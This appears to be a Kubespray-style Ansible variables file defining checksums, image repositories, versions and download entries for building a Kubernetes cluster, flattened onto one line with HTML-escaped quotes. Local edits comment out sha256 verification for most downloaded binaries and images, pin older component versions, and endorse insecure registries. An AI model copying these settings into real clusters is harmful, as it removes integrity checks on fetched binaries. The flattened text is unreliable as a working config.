moment, having some dummy value is# required to avoid \u0026#34;no attribute\u0026#34; errorarm:0arm64:01bd849ad99693600bd59db8d0e66ac64aac1e3801900665c31bd393972e3554amd64:6c642b723a86941b99753dff6c00b26d3b033209b15ee33325dc8e7f4cd68f07cni_binary_checksums:arm:5757778f4c322ffd93d7586c60037b81a2eb79271af6f4edf9ff62b4f7868ed9arm64:ae13d7b5c05bd180ea9b5b68f44bdaa7bfb41034a2ef1d68fd8e1259797d642famd64:977824932d5667c7a37aa6a3cbba40100a6873e7bd97e83e8be837e3e7afd0a8calicoctl_binary_checksums:arm:v3.15.2:0v3.14.1:0v3.13.3:0amd64:v3.15.2:219ae954501cbe15daeda0ad52e13ec65f99c77548c7d3cbfc4ced5c7149fdf1v3.14.1:5fe8a7b00a45cf48879eff42b08dcdb85cf0121f3720ac8cbd06566aaa385667v3.13.3:570539d436df51bb349bb1a8c6b200a3a6f20803a9d391aa2c5cf19a70a083d4arm64:v3.15.2:49165f9e4ad55402248b578310fcf68a57363f54e66be04ac24be9714899b4d5v3.14.1:326da28cb726988029f70fbf3d4de424a4edd9949fd435fad81f2203c93e4c36v3.13.3:0c47acd6d200ba1f8348b389cd7a54771542158fef657afc633a30ddad97e272etcd_binary_checksum:\u0026#34;{{ etcd_binary_checksums[image_arch] }}\u0026#34;cni_binary_checksum:\u0026#34;{{ cni_binary_checksums[image_arch] }}\u0026#34;kubelet_binary_checksum:\u0026#34;{{ kubelet_checksums[image_arch][kube_version] }}\u0026#34;kubectl_binary_checksum:\u0026#34;{{ kubectl_checksums[image_arch][kube_version] }}\u0026#34;kubeadm_binary_checksum:\u0026#34;{{ kubeadm_checksums[image_arch][kubeadm_version] }}\u0026#34;calicoctl_binary_checksum:\u0026#34;{{ calicoctl_binary_checksums[image_arch][calico_ctl_version] }}\u0026#34;crictl_binary_checksum:\u0026#34;{{ crictl_checksums[image_arch][crictl_version] }}\u0026#34;# Containers# In some cases, we need a way to set --registry-mirror or --insecure-registry for docker,# it helps a lot for local private development or bare metal environment.# So you need define --registry-mirror or --insecure-registry, and modify the following url address.# example:# You need to deploy kubernetes cluster on local private development.# Also provide the address of your own private registry.# And use --insecure-registry options for dockerkube_proxy_image_repo:\u0026#34;{{ kube_image_repo }}/kube-proxy\u0026#34;etcd_image_repo:\u0026#34;{{ quay_image_repo }}/coreos/etcd\u0026#34;etcd_image_tag:\u0026#34;{{ etcd_version }}{%- if image_arch != \u0026#39;amd64\u0026#39; -%}-{{ image_arch }}{%- endif -%}\u0026#34;flannel_image_repo:\u0026#34;{{ quay_image_repo }}/coreos/flannel\u0026#34;flannel_image_tag:\u0026#34;{{ flannel_version }}\u0026#34;calico_node_image_repo:\u0026#34;{{ docker_image_repo }}/calico/node\u0026#34;calico_node_image_tag:\u0026#34;{{ calico_version }}\u0026#34;calico_cni_image_repo:\u0026#34;{{ docker_image_repo }}/calico/cni\u0026#34;calico_cni_image_tag:\u0026#34;{{ calico_cni_version }}\u0026#34;calico_policy_image_repo:\u0026#34;{{ docker_image_repo }}/calico/kube-controllers\u0026#34;calico_policy_image_tag:\u0026#34;{{ calico_policy_version }}\u0026#34;calico_typha_image_repo:\u0026#34;{{ docker_image_repo }}/calico/typha\u0026#34;calico_typha_image_tag:\u0026#34;{{ calico_typha_version }}\u0026#34;pod_infra_image_repo:\u0026#34;{{ kube_image_repo }}/pause\u0026#34;pod_infra_image_tag:\u0026#34;{{ pod_infra_version }}\u0026#34;install_socat_image_repo:\u0026#34;{{ docker_image_repo }}/xueshanf/install-socat\u0026#34;install_socat_image_tag:\u0026#34;latest\u0026#34;netcheck_version:\u0026#34;v1.0\u0026#34;netcheck_agent_image_repo:\u0026#34;{{ quay_image_repo }}/l23network/k8s-netchecker-agent\u0026#34;netcheck_agent_image_tag:\u0026#34;{{ netcheck_version }}\u0026#34;netcheck_server_image_repo:\u0026#34;{{ quay_image_repo }}/l23network/k8s-netchecker-server\u0026#34;netcheck_server_image_tag:\u0026#34;{{ netcheck_version }}\u0026#34;weave_kube_image_repo:\u0026#34;{{ docker_image_repo }}/weaveworks/weave-kube\u0026#34;weave_kube_image_tag:\u0026#34;{{ weave_version }}\u0026#34;weave_npc_image_repo:\u0026#34;{{ docker_image_repo }}/weaveworks/weave-npc\u0026#34;weave_npc_image_tag:\u0026#34;{{ weave_version }}\u0026#34;contiv_image_repo:\u0026#34;{{ docker_image_repo }}/contiv/netplugin\u0026#34;contiv_image_tag:\u0026#34;{{ contiv_version }}\u0026#34;contiv_init_image_repo:\u0026#34;{{ docker_image_repo }}/contiv/netplugin-init\u0026#34;contiv_init_image_tag:\u0026#34;{{ contiv_version }}\u0026#34;contiv_auth_proxy_image_repo:\u0026#34;{{ docker_image_repo }}/contiv/auth_proxy\u0026#34;contiv_auth_proxy_image_tag:\u0026#34;{{ contiv_version }}\u0026#34;contiv_etcd_init_image_repo:\u0026#34;{{ docker_image_repo }}/ferest/etcd-initer\u0026#34;contiv_etcd_init_image_tag:latestcontiv_ovs_image_repo:\u0026#34;{{ docker_image_repo }}/contiv/ovs\u0026#34;contiv_ovs_image_tag:\u0026#34;latest\u0026#34;cilium_image_repo:\u0026#34;{{ docker_image_repo }}/cilium/cilium\u0026#34;cilium_image_tag:\u0026#34;{{ cilium_version }}\u0026#34;cilium_init_image_repo:\u0026#34;{{ docker_image_repo }}/cilium/cilium-init\u0026#34;cilium_init_image_tag:\u0026#34;2019-04-05\u0026#34;cilium_operator_image_repo:\u0026#34;{{ docker_image_repo }}/cilium/operator\u0026#34;cilium_operator_image_tag:\u0026#34;{{ cilium_version }}\u0026#34;kube_ovn_container_image_repo:\u0026#34;{{ docker_image_repo }}/kubeovn/kube-ovn\u0026#34;kube_ovn_container_image_tag:\u0026#34;{{ kube_ovn_version }}\u0026#34;kube_router_image_repo:\u0026#34;{{ docker_image_repo }}/cloudnativelabs/kube-router\u0026#34;kube_router_image_tag:\u0026#34;{{ kube_router_version }}\u0026#34;multus_image_repo:\u0026#34;{{ docker_image_repo }}/nfvpe/multus\u0026#34;multus_image_tag:\u0026#34;{{ multus_version }}\u0026#34;ovn4nfv_ovn_image_repo:\u0026#34;{{ docker_image_repo }}/integratedcloudnative/ovn-images\u0026#34;ovn4nfv_ovn_image_tag:\u0026#34;{{ ovn4nfv_ovn_image_version }}\u0026#34;ovn4nfv_k8s_plugin_image_repo:\u0026#34;{{ docker_image_repo }}/integratedcloudnative/ovn4nfv-k8s-plugin\u0026#34;ovn4nfv_k8s_plugin_image_tag:\u0026#34;{{ ovn4nfv_k8s_plugin_image_version }}\u0026#34;nginx_image_repo:\u0026#34;{{ docker_image_repo }}/library/nginx\u0026#34;nginx_image_tag:1.19haproxy_image_repo:\u0026#34;{{ docker_image_repo }}/library/haproxy\u0026#34;haproxy_image_tag:2.1# Coredns version should be supported by corefile-migration (or at least work with)# bundle with kubeadm; if not \u0026#39;basic\u0026#39; upgrade can sometimes fail# add by wangb#coredns_version: \u0026#34;1.6.7\u0026#34;coredns_version:\u0026#34;1.7.0\u0026#34;coredns_image_repo:\u0026#34;{{ docker_image_repo }}/coredns/coredns\u0026#34;coredns_image_tag:\u0026#34;{{ coredns_version }}\u0026#34;nodelocaldns_version:\u0026#34;1.15.13\u0026#34;nodelocaldns_image_repo:\u0026#34;{{ kube_image_repo }}/k8s-dns-node-cache\u0026#34;nodelocaldns_image_tag:\u0026#34;{{ nodelocaldns_version }}\u0026#34;# add by wangb start#dnsautoscaler_version: 1.8.1dnsautoscaler_version:v1.3.0dnsautoscaler_image_repo:\u0026#34;{{ kube_image_repo }}/cluster-proportional-autoscaler-{{ image_arch }}\u0026#34;dnsautoscaler_image_tag:\u0026#34;{{ dnsautoscaler_version }}\u0026#34;# add by wangb endtest_image_repo:\u0026#34;{{ docker_image_repo }}/library/busybox\u0026#34;test_image_tag:latestbusybox_image_repo:\u0026#34;{{ docker_image_repo }}/library/busybox\u0026#34;busybox_image_tag:1.32.0helm_version:\u0026#34;v3.2.4\u0026#34;helm_image_repo:\u0026#34;{{ docker_image_repo }}/lachlanevenson/k8s-helm\u0026#34;helm_image_tag:\u0026#34;{{ helm_version }}\u0026#34;tiller_image_repo:\u0026#34;{{ gcr_image_repo }}/kubernetes-helm/tiller\u0026#34;tiller_image_tag:\u0026#34;{{ helm_version }}\u0026#34;registry_image_repo:\u0026#34;{{ docker_image_repo }}/library/registry\u0026#34;registry_image_tag:\u0026#34;2.7.1\u0026#34;registry_proxy_image_repo:\u0026#34;{{ kube_image_repo }}/kube-registry-proxy\u0026#34;registry_proxy_image_tag:\u0026#34;0.4\u0026#34;# add by wangb start#metrics_server_version: \u0026#34;v0.3.7\u0026#34;#metrics_server_image_repo: \u0026#34;{{ kube_image_repo }}/metrics-server/metrics-server\u0026#34;metrics_server_version:\u0026#34;v0.3.6\u0026#34;metrics_server_image_repo:\u0026#34;{{ kube_image_repo }}/metrics-server-amd64\u0026#34;# add by wangb endmetrics_server_image_tag:\u0026#34;{{ metrics_server_version }}\u0026#34;local_volume_provisioner_image_repo:\u0026#34;{{ quay_image_repo }}/external_storage/local-volume-provisioner\u0026#34;local_volume_provisioner_image_tag:\u0026#34;v2.3.4\u0026#34;cephfs_provisioner_image_repo:\u0026#34;{{ quay_image_repo }}/external_storage/cephfs-provisioner\u0026#34;cephfs_provisioner_image_tag:\u0026#34;v2.1.0-k8s1.11\u0026#34;rbd_provisioner_image_repo:\u0026#34;{{ quay_image_repo }}/external_storage/rbd-provisioner\u0026#34;rbd_provisioner_image_tag:\u0026#34;v2.1.1-k8s1.11\u0026#34;local_path_provisioner_image_repo:\u0026#34;{{ docker_image_repo }}/rancher/local-path-provisioner\u0026#34;local_path_provisioner_image_tag:\u0026#34;v0.0.14\u0026#34;ingress_nginx_controller_image_repo:\u0026#34;{{ kube_image_repo }}/ingress-nginx/controller\u0026#34;# add by wangb start#ingress_nginx_controller_image_tag: \u0026#34;v0.35.0\u0026#34;ingress_nginx_controller_image_tag:\u0026#34;v0.25.1\u0026#34;# add by wangb endingress_ambassador_image_repo:\u0026#34;{{ quay_image_repo }}/datawire/ambassador-operator\u0026#34;ingress_ambassador_image_tag:\u0026#34;v1.2.8\u0026#34;alb_ingress_image_repo:\u0026#34;{{ docker_image_repo }}/amazon/aws-alb-ingress-controller\u0026#34;alb_ingress_image_tag:\u0026#34;v1.1.8\u0026#34;cert_manager_version:\u0026#34;v0.16.1\u0026#34;cert_manager_controller_image_repo:\u0026#34;{{ quay_image_repo }}/jetstack/cert-manager-controller\u0026#34;cert_manager_controller_image_tag:\u0026#34;{{ cert_manager_version }}\u0026#34;cert_manager_cainjector_image_repo:\u0026#34;{{ quay_image_repo }}/jetstack/cert-manager-cainjector\u0026#34;cert_manager_cainjector_image_tag:\u0026#34;{{ cert_manager_version }}\u0026#34;cert_manager_webhook_image_repo:\u0026#34;{{ quay_image_repo }}/jetstack/cert-manager-webhook\u0026#34;cert_manager_webhook_image_tag:\u0026#34;{{ cert_manager_version }}\u0026#34;addon_resizer_version:\u0026#34;1.8.11\u0026#34;addon_resizer_image_repo:\u0026#34;{{ kube_image_repo }}/addon-resizer\u0026#34;addon_resizer_image_tag:\u0026#34;{{ addon_resizer_version }}\u0026#34;csi_attacher_image_repo:\u0026#34;{{ quay_image_repo }}/k8scsi/csi-attacher\u0026#34;csi_attacher_image_tag:\u0026#34;v2.2.0\u0026#34;csi_provisioner_image_repo:\u0026#34;{{ quay_image_repo }}/k8scsi/csi-provisioner\u0026#34;csi_provisioner_image_tag:\u0026#34;v1.6.0\u0026#34;csi_snapshotter_image_repo:\u0026#34;{{ quay_image_repo }}/k8scsi/csi-snapshotter\u0026#34;csi_snapshotter_image_tag:\u0026#34;v2.1.1\u0026#34;csi_resizer_image_repo:\u0026#34;{{ quay_image_repo }}/k8scsi/csi-resizer\u0026#34;csi_resizer_image_tag:\u0026#34;v0.5.0\u0026#34;csi_node_driver_registrar_image_repo:\u0026#34;{{ quay_image_repo }}/k8scsi/csi-node-driver-registrar\u0026#34;csi_node_driver_registrar_image_tag:\u0026#34;v1.3.0\u0026#34;csi_livenessprobe_image_repo:\u0026#34;{{ quay_image_repo }}/k8scsi/livenessprobe\u0026#34;csi_livenessprobe_image_tag:\u0026#34;v2.0.0\u0026#34;snapshot_controller_image_repo:\u0026#34;{{ quay_image_repo }}/k8scsi/snapshot-controller\u0026#34;snapshot_controller_image_tag:\u0026#34;v2.0.1\u0026#34;cinder_csi_plugin_image_repo:\u0026#34;{{ docker_image_repo }}/k8scloudprovider/cinder-csi-plugin\u0026#34;cinder_csi_plugin_image_tag:\u0026#34;v1.18.0\u0026#34;aws_ebs_csi_plugin_image_repo:\u0026#34;{{ docker_image_repo }}/amazon/aws-ebs-csi-driver\u0026#34;aws_ebs_csi_plugin_image_tag:\u0026#34;v0.5.0\u0026#34;azure_csi_image_repo:\u0026#34;mcr.microsoft.com/oss/kubernetes-csi\u0026#34;azure_csi_provisioner_image_tag:\u0026#34;v1.5.0\u0026#34;azure_csi_attacher_image_tag:\u0026#34;v1.2.0\u0026#34;azure_csi_cluster_registrar_image_tag:\u0026#34;v1.0.1\u0026#34;azure_csi_node_registrar_image_tag:\u0026#34;v1.1.0\u0026#34;azure_csi_snapshotter_image_tag:\u0026#34;v2.0.0\u0026#34;azure_csi_resizer_image_tag:\u0026#34;v0.3.0\u0026#34;azure_csi_livenessprobe_image_tag:\u0026#34;v1.1.0\u0026#34;azure_csi_plugin_image_repo:\u0026#34;mcr.microsoft.com/k8s/csi\u0026#34;azure_csi_plugin_image_tag:\u0026#34;v0.7.0\u0026#34;gcp_pd_csi_image_repo:\u0026#34;gke.gcr.io\u0026#34;gcp_pd_csi_driver_image_tag:\u0026#34;v0.7.0-gke.0\u0026#34;gcp_pd_csi_provisioner_image_tag:\u0026#34;v1.5.0-gke.0\u0026#34;gcp_pd_csi_attacher_image_tag:\u0026#34;v2.1.1-gke.0\u0026#34;gcp_pd_csi_resizer_image_tag:\u0026#34;v0.4.0-gke.0\u0026#34;gcp_pd_csi_registrar_image_tag:\u0026#34;v1.2.0-gke.0\u0026#34;dashboard_image_repo:\u0026#34;{{ docker_image_repo }}/kubernetesui/dashboard-{{ image_arch }}\u0026#34;dashboard_image_tag:\u0026#34;v2.0.4\u0026#34;dashboard_metrics_scraper_repo:\u0026#34;{{ docker_image_repo }}/kubernetesui/metrics-scraper\u0026#34;dashboard_metrics_scraper_tag:\u0026#34;v1.0.5\u0026#34;image_pull_command:\u0026#34;{{ docker_bin_dir }}/docker pull\u0026#34;image_save_command:\u0026#34;{{ docker_bin_dir }}/docker save {{ image_reponame }} | gzip -{{ download_compress }} \u0026gt; {{ image_path_final }}\u0026#34;image_load_command:\u0026#34;{{ docker_bin_dir }}/docker load \u0026lt; {{ image_path_final }}\u0026#34;image_info_command:\u0026#34;{{ docker_bin_dir }}/docker images -q | xargs {{ docker_bin_dir }}/docker inspect -f \\\u0026#34;{{ \u0026#39;{{\u0026#39; }} if .RepoTags {{ \u0026#39;}}\u0026#39; }}{{ \u0026#39;{{\u0026#39; }} (join .RepoTags \\\\\\\u0026#34;,\\\\\\\u0026#34;) {{ \u0026#39;}}\u0026#39; }}{{ \u0026#39;{{\u0026#39; }} end {{ \u0026#39;}}\u0026#39; }}{{ \u0026#39;{{\u0026#39; }} if .RepoDigests {{ \u0026#39;}}\u0026#39; }},{{ \u0026#39;{{\u0026#39; }} (join .RepoDigests \\\\\\\u0026#34;,\\\\\\\u0026#34;) {{ \u0026#39;}}\u0026#39; }}{{ \u0026#39;{{\u0026#39; }} end {{ \u0026#39;}}\u0026#39; }}\\\u0026#34; | tr \u0026#39;\\n\u0026#39; \u0026#39;,\u0026#39;\u0026#34;image_pull_command_on_localhost:\u0026#34;{{ docker_bin_dir }}/docker pull\u0026#34;image_save_command_on_localhost:\u0026#34;{{ docker_bin_dir }}/docker save {{ image_reponame }} | gzip -{{ download_compress }} \u0026gt; {{ image_path_cached }}\u0026#34;image_info_command_on_localhost:\u0026#34;{{ docker_bin_dir }}/docker images\u0026#34;downloads:netcheck_server:enabled:\u0026#34;{{ deploy_netchecker }}\u0026#34;container:truerepo:\u0026#34;{{ netcheck_server_image_repo }}\u0026#34;tag:\u0026#34;{{ netcheck_server_image_tag }}\u0026#34;# sha256: \u0026#34;{{ netcheck_server_digest_checksum|default(None) }}\u0026#34;groups:- k8s-clusternetcheck_agent:enabled:\u0026#34;{{ deploy_netchecker }}\u0026#34;container:truerepo:\u0026#34;{{ netcheck_agent_image_repo }}\u0026#34;tag:\u0026#34;{{ netcheck_agent_image_tag }}\u0026#34;# sha256: \u0026#34;{{ netcheck_agent_digest_checksum|default(None) }}\u0026#34;groups:- k8s-clusteretcd:container:\u0026#34;{{ etcd_deployment_type != \u0026#39;host\u0026#39; }}\u0026#34;file:\u0026#34;{{ etcd_deployment_type == \u0026#39;host\u0026#39; }}\u0026#34;enabled:trueversion:\u0026#34;{{ etcd_version }}\u0026#34;dest:\u0026#34;{{ local_release_dir }}/etcd-{{ etcd_version }}-linux-amd64.tar.gz\u0026#34;repo:\u0026#34;{{ etcd_image_repo }}\u0026#34;tag:\u0026#34;{{ etcd_image_tag }}\u0026#34;sha256:\u0026gt;-{{ etcd_binary_checksum if (etcd_deployment_type == \u0026#39;host\u0026#39;) else etcd_digest_checksum|d(None) }}url:\u0026#34;{{ etcd_download_url }}\u0026#34;unarchive:\u0026#34;{{ etcd_deployment_type == \u0026#39;host\u0026#39; }}\u0026#34;owner:\u0026#34;root\u0026#34;mode:\u0026#34;0755\u0026#34;groups:- etcdcni:enabled:truefile:trueversion:\u0026#34;{{ cni_version }}\u0026#34;dest:\u0026#34;{{local_release_dir}}/cni-plugins-linux-{{ image_arch }}-{{ cni_version }}.tgz\u0026#34;# sha256: \u0026#34;{{ cni_binary_checksum }}\u0026#34;url:\u0026#34;{{ cni_download_url }}\u0026#34;unarchive:falseowner:\u0026#34;root\u0026#34;mode:\u0026#34;0755\u0026#34;groups:- k8s-clusterkubeadm:enabled:truefile:trueversion:\u0026#34;{{ kubeadm_version }}\u0026#34;dest:\u0026#34;{{ local_release_dir }}/kubeadm-{{ kubeadm_version }}-{{ image_arch }}\u0026#34;# sha256: \u0026#34;{{ kubeadm_binary_checksum }}\u0026#34;url:\u0026#34;{{ kubeadm_download_url }}\u0026#34;unarchive:falseowner:\u0026#34;root\u0026#34;mode:\u0026#34;0755\u0026#34;groups:- k8s-clusterkubelet:enabled:truefile:trueversion:\u0026#34;{{ kube_version }}\u0026#34;dest:\u0026#34;{{ local_release_dir }}/kubelet-{{ kube_version }}-{{ image_arch }}\u0026#34;# sha256: \u0026#34;{{ kubelet_binary_checksum }}\u0026#34;url:\u0026#34;{{ kubelet_download_url }}\u0026#34;unarchive:falseowner:\u0026#34;root\u0026#34;mode:\u0026#34;0755\u0026#34;groups:- k8s-clusterkubectl:enabled:truefile:trueversion:\u0026#34;{{ kube_version }}\u0026#34;dest:\u0026#34;{{ local_release_dir }}/kubectl-{{ kube_version }}-{{ image_arch }}\u0026#34;# sha256: \u0026#34;{{ kubectl_binary_checksum }}\u0026#34;url:\u0026#34;{{ kubectl_download_url }}\u0026#34;unarchive:falseowner:\u0026#34;root\u0026#34;mode:\u0026#34;0755\u0026#34;groups:- kube-mastercrictl:file:trueenabled:\u0026#34;{{ container_manager in [\u0026#39;crio\u0026#39;, \u0026#39;cri\u0026#39;, \u0026#39;containerd\u0026#39;] }}\u0026#34;version:\u0026#34;{{ crictl_version }}\u0026#34;dest:\u0026#34;{{local_release_dir}}/crictl-{{ crictl_version }}-linux-{{ image_arch }}.tar.gz\u0026#34;# sha256: \u0026#34;{{ crictl_binary_checksum }}\u0026#34;url:\u0026#34;{{ crictl_download_url }}\u0026#34;unarchive:trueowner:\u0026#34;root\u0026#34;mode:\u0026#34;0755\u0026#34;groups:- k8s-clustercilium:enabled:\u0026#34;{{ kube_network_plugin == \u0026#39;cilium\u0026#39; or cilium_deploy_additionally | default(false) | bool }}\u0026#34;container:truerepo:\u0026#34;{{ cilium_image_repo }}\u0026#34;tag:\u0026#34;{{ cilium_image_tag }}\u0026#34;# sha256: \u0026#34;{{ cilium_digest_checksum|default(None) }}\u0026#34;groups:- k8s-clustercilium_init:enabled:\u0026#34;{{ kube_network_plugin == \u0026#39;cilium\u0026#39; or cilium_deploy_additionally | default(false) | bool }}\u0026#34;container:truerepo:\u0026#34;{{ cilium_init_image_repo }}\u0026#34;tag:\u0026#34;{{ cilium_init_image_tag }}\u0026#34;# sha256: \u0026#34;{{ cilium_init_digest_checksum|default(None) }}\u0026#34;groups:- k8s-clustercilium_operator:enabled:\u0026#34;{{ kube_network_plugin == \u0026#39;cilium\u0026#39; or cilium_deploy_additionally | default(false) | bool }}\u0026#34;container:truerepo:\u0026#34;{{ cilium_operator_image_repo }}\u0026#34;tag:\u0026#34;{{ cilium_operator_image_tag }}\u0026#34;# sha256: \u0026#34;{{ cilium_operator_digest_checksum|default(None) }}\u0026#34;groups:- k8s-clustermultus:enabled:\u0026#34;{{ kube_network_plugin_multus }}\u0026#34;container:truerepo:\u0026#34;{{ multus_image_repo }}\u0026#34;tag:\u0026#34;{{ multus_image_tag }}\u0026#34;# sha256: \u0026#34;{{ multus_digest_checksum|default(None) }}\u0026#34;groups:- k8s-clusterflannel:enabled:\u0026#34;{{ kube_network_plugin == \u0026#39;flannel\u0026#39; or kube_network_plugin == \u0026#39;canal\u0026#39; }}\u0026#34;container:truerepo:\u0026#34;{{ flannel_image_repo }}\u0026#34;tag:\u0026#34;{{ flannel_image_tag }}\u0026#34;# sha256: \u0026#34;{{ flannel_digest_checksum|default(None) }}\u0026#34;groups:- k8s-clustercalicoctl:enabled:\u0026#34;{{ kube_network_plugin == \u0026#39;calico\u0026#39; or kube_network_plugin == \u0026#39;canal\u0026#39; }}\u0026#34;file:trueversion:\u0026#34;{{ calico_ctl_version }}\u0026#34;dest:\u0026#34;{{ local_release_dir }}/calicoctl\u0026#34;# sha256: \u0026#34;{{ calicoctl_binary_checksum }}\u0026#34;url:\u0026#34;{{ calicoctl_download_url }}\u0026#34;unarchive:falseowner:\u0026#34;root\u0026#34;mode:\u0026#34;0755\u0026#34;groups:- k8s-clustercalico_node:enabled:\u0026#34;{{ kube_network_plugin == \u0026#39;calico\u0026#39; or kube_network_plugin == \u0026#39;canal\u0026#39; }}\u0026#34;container:truerepo:\u0026#34;{{ calico_node_image_repo }}\u0026#34;tag:\u0026#34;{{ calico_node_image_tag }}\u0026#34;sha256:\u0026#34;{{ calico_node_digest_checksum|default(None) }}\u0026#34;groups:- k8s-clustercalico_cni:enabled:\u0026#34;{{ kube_network_plugin == \u0026#39;calico\u0026#39; or kube_network_plugin == \u0026#39;canal\u0026#39; }}\u0026#34;container:truerepo:\u0026#34;{{ calico_cni_image_repo }}\u0026#34;tag:\u0026#34;{{ calico_cni_image_tag }}\u0026#34;sha256:\u0026#34;{{ calico_cni_digest_checksum|default(None) }}\u0026#34;groups:- k8s-clustercalico_policy:enabled:\u0026#34;{{ enable_network_policy and kube_network_plugin in [\u0026#39;calico\u0026#39;, \u0026#39;canal\u0026#39;] }}\u0026#34;container:truerepo:\u0026#34;{{ calico_policy_image_repo }}\u0026#34;tag:\u0026#34;{{ calico_policy_image_tag }}\u0026#34;sha256:\u0026#34;{{ calico_policy_digest_checksum|default(None) }}\u0026#34;groups:- k8s-clustercalico_typha:enabled:\u0026#34;{{ typha_enabled }}\u0026#34;container:truerepo:\u0026#34;{{ calico_typha_image_repo }}\u0026#34;tag:\u0026#34;{{ calico_typha_image_tag }}\u0026#34;sha256:\u0026#34;{{ calico_typha_digest_checksum|default(None) }}\u0026#34;groups:- k8s-clusterweave_kube:enabled:\u0026#34;{{ kube_network_plugin == \u0026#39;weave\u0026#39; }}\u0026#34;container:truerepo:\u0026#34;{{ weave_kube_image_repo }}\u0026#34;tag:\u0026#34;{{ weave_kube_image_tag }}\u0026#34;# sha256: \u0026#34;{{ weave_kube_digest_checksum|default(None) }}\u0026#34;groups:- k8s-clusterweave_npc:enabled:\u0026#34;{{ kube_network_plugin == \u0026#39;weave\u0026#39; }}\u0026#34;container:truerepo:\u0026#34;{{ weave_npc_image_repo }}\u0026#34;tag:\u0026#34;{{ weave_npc_image_tag }}\u0026#34;# sha256: \u0026#34;{{ weave_npc_digest_checksum|default(None) }}\u0026#34;groups:- k8s-clusterovn4nfv:enabled:\u0026#34;{{ kube_network_plugin == \u0026#39;ovn4nfv\u0026#39; }}\u0026#34;container:truerepo:\u0026#34;{{ ovn4nfv_k8s_plugin_image_repo }}\u0026#34;tag:\u0026#34;{{ ovn4nfv_k8s_plugin_image_tag }}\u0026#34;# sha256: \u0026#34;{{ ovn4nfv_k8s_plugin_digest_checksum|default(None) }}\u0026#34;groups:- k8s-clustercontiv:enabled:\u0026#34;{{ kube_network_plugin == \u0026#39;contiv\u0026#39; }}\u0026#34;container:truerepo:\u0026#34;{{ contiv_image_repo }}\u0026#34;tag:\u0026#34;{{ contiv_image_tag }}\u0026#34;# sha256: \u0026#34;{{ contiv_digest_checksum|default(None) }}\u0026#34;groups:- k8s-clustercontiv_auth_proxy:enabled:\u0026#34;{{ kube_network_plugin == \u0026#39;contiv\u0026#39; }}\u0026#34;container:truerepo:\u0026#34;{{ contiv_auth_proxy_image_repo }}\u0026#34;tag:\u0026#34;{{ contiv_auth_proxy_image_tag }}\u0026#34;# sha256: \u0026#34;{{ contiv_auth_proxy_digest_checksum|default(None) }}\u0026#34;groups:- k8s-clustercontiv_etcd_init:enabled:\u0026#34;{{ kube_network_plugin == \u0026#39;contiv\u0026#39; }}\u0026#34;container:truerepo:\u0026#34;{{ contiv_etcd_init_image_repo }}\u0026#34;tag:\u0026#34;{{ contiv_etcd_init_image_tag }}\u0026#34;# sha256: \u0026#34;{{ contiv_etcd_init_digest_checksum|default(None) }}\u0026#34;groups:- k8s-clusterkube_ovn:enabled:\u0026#34;{{ kube_network_plugin == \u0026#39;kube-ovn\u0026#39; }}\u0026#34;container:truerepo:\u0026#34;{{ kube_ovn_container_image_repo }}\u0026#34;tag:\u0026#34;{{ kube_ovn_container_image_tag }}\u0026#34;# sha256: \u0026#34;{{ kube_ovn_digest_checksum|default(None) }}\u0026#34;groups:- k8s-clusterkube_router:enabled:\u0026#34;{{ kube_network_plugin == \u0026#39;kube-router\u0026#39; }}\u0026#34;container:truerepo:\u0026#34;{{ kube_router_image_repo }}\u0026#34;tag:\u0026#34;{{ kube_router_image_tag }}\u0026#34;# sha256: \u0026#34;{{ kube_router_digest_checksum|default(None) }}\u0026#34;groups:- k8s-clusterpod_infra:enabled:truecontainer:truerepo:\u0026#34;{{ pod_infra_image_repo }}\u0026#34;tag:\u0026#34;{{ pod_infra_image_tag }}\u0026#34;# sha256: \u0026#34;{{ pod_infra_digest_checksum|default(None) }}\u0026#34;groups:- k8s-clusterinstall_socat:enabled:\u0026#34;{{ ansible_os_family in [\u0026#39;Flatcar Container Linux by Kinvolk\u0026#39;] }}\u0026#34;container:truerepo:\u0026#34;{{ install_socat_image_repo }}\u0026#34;tag:\u0026#34;{{ install_socat_image_tag }}\u0026#34;# sha256: \u0026#34;{{ install_socat_digest_checksum|default(None) }}\u0026#34;groups:- k8s-clusternginx:enabled:\u0026#34;{{ loadbalancer_apiserver_localhost and loadbalancer_apiserver_type == \u0026#39;nginx\u0026#39; }}\u0026#34;container:truerepo:\u0026#34;{{ nginx_image_repo }}\u0026#34;tag:\u0026#34;{{ nginx_image_tag }}\u0026#34;sha256:\u0026#34;{{ nginx_digest_checksum|default(None) }}\u0026#34;groups:- kube-nodehaproxy:enabled:\u0026#34;{{ loadbalancer_apiserver_localhost and loadbalancer_apiserver_type == \u0026#39;haproxy\u0026#39; }}\u0026#34;container:truerepo:\u0026#34;{{ haproxy_image_repo }}\u0026#34;tag:\u0026#34;{{ haproxy_image_tag }}\u0026#34;sha256:\u0026#34;{{ haproxy_digest_checksum|default(None) }}\u0026#34;groups:- kube-nodecoredns:enabled:\u0026#34;{{ dns_mode in [\u0026#39;coredns\u0026#39;, \u0026#39;coredns_dual\u0026#39;] }}\u0026#34;container:truerepo:\u0026#34;{{ coredns_image_repo }}\u0026#34;tag:\u0026#34;{{ coredns_image_tag }}\u0026#34;sha256:\u0026#34;{{ coredns_digest_checksum|default(None) }}\u0026#34;groups:- kube-masternodelocaldns:enabled:\u0026#34;{{ enable_nodelocaldns }}\u0026#34;container:truerepo:\u0026#34;{{ nodelocaldns_image_repo }}\u0026#34;tag:\u0026#34;{{ nodelocaldns_image_tag }}\u0026#34;sha256:\u0026#34;{{ nodelocaldns_digest_checksum|default(None) }}\u0026#34;groups:- k8s-clusterdnsautoscaler:enabled:\u0026#34;{{ dns_mode in [\u0026#39;coredns\u0026#39;, \u0026#39;coredns_dual\u0026#39;] }}\u0026#34;container:truerepo:\u0026#34;{{ dnsautoscaler_image_repo }}\u0026#34;tag:\u0026#34;{{ dnsautoscaler_image_tag }}\u0026#34;sha256:\u0026#34;{{ dnsautoscaler_digest_checksum|default(None) }}\u0026#34;groups:- kube-masterbusybox:enabled:\u0026#34;{{ kube_network_plugin in [\u0026#39;kube-router\u0026#39;] }}\u0026#34;container:truerepo:\u0026#34;{{ busybox_image_repo }}\u0026#34;tag:\u0026#34;{{ busybox_image_tag }}\u0026#34;sha256:\u0026#34;{{ busybox_digest_checksum|default(None) }}\u0026#34;groups:- k8s-clustertestbox:enabled:falsecontainer:truerepo:\u0026#34;{{ test_image_repo }}\u0026#34;tag:\u0026#34;{{ test_image_tag }}\u0026#34;sha256:\u0026#34;{{ testbox_digest_checksum|default(None) }}\u0026#34;helm:enabled:\u0026#34;{{ helm_enabled 